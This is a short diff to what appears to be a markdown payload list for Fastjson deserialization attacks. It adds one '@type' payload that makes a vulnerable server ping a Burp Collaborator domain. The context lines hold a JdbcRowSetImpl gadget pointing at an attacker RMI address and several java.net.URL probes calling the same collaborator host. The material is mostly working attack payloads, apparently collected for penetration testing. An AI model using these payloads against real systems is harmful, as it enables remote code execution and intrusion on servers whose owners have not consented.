@@ -52,6 +52,7 @@ param={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://your ip/"
 {"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
 {"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
 {{"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net}
+{"@type":"java.lang.Exception", "@type":"PingException","domain":"ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
 
 ```
 
